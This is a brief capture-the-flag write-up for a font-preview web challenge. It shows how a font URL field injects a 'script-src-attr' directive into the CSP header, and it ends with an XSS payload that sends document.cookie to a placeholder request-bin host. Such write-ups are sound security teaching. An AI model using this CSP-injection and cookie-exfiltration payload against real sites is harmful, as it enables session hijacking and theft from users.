# look_my_font

The site has basically two functionalities: a try-font and a share-font.

They are pretty the same but try-font let us preview the font, share-font basically send this preview to the server.

Then we can use try-font to debug the XSS and then use share-font to exploit it.

There are three fields:

- Text: the text to preview, not sanitized
- Font Name: the font name, sanitized thus not useful
- Font URL: the font URL

How can this stuff work? How can it preview a font from whatever URL?
It just append the font url to the CSP header, then the browser will download the font and use it to render the text. But this is a HUGE vulnerability, because now we have full control of the CSP header.

Oh, not quite. We cannot add any directive to the CSP header, we can only add directives that are not already present, and a LOT of directives are already present.

Then using [MDN CSP](`https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy`) we can find a lot of directives that we can use. And I jumped on `script-src-attr` that let us specify valid sources for JavaScript inline event handlers.

Having this in mind, we can use the following payload:

```html
Text: <img src=x onerror=window.location.href='{SOME.REQUEST.BIN}/?cookie='+document.cookie>
Font Name: XSS is cool
Font URL: ; script-src-attr 'unsafe-inline'
```
